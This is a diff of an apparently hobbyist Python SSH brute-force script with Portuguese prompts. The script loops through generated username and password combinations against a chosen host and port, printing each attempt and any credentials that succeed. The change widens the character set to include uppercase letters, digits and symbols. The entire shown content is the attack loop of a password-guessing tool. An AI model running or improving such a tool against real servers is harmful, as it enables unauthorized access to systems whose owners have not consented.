@@ -1,5 +1,6 @@
 from functions import generate_combinations, ssh_login
 
+# Cores para o terminal
 colors = {
     'purple': '\033[95m',
     'cyan': '\033[96m',
@@ -19,17 +20,20 @@ if __name__ == "__main__":
     max_length = int(input("QUANTIDADE MÁXIMA DE CARACTERES: "))
     min_length = int(input("QUANTIDADE MÍNIMA DE CARACTERES: "))
 
-    characters = r"abcdefghijklmnopqrstuvwxyz"
+    characters = r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*_+=-?.,"
 
     print(f"\n{colors['red']}ATACANDO...{colors['end']}")
     count = 0
+
     for x in generate_combinations(characters, min_length, max_length):
         username = x
         for y in generate_combinations(characters, min_length, max_length):
             password = y
+
             print(f"\n{colors['yellow']}TENTANDO:{colors['end']}")
             print(f"Usuário >> {username}")
             print(f"Senha >> {password}")
+
             if ssh_login(host, port, username, password):
                 print(f"\n{colors['green']}ENCONTRADO:{colors['end']}")
                 print(f"Usuário >> {username}")
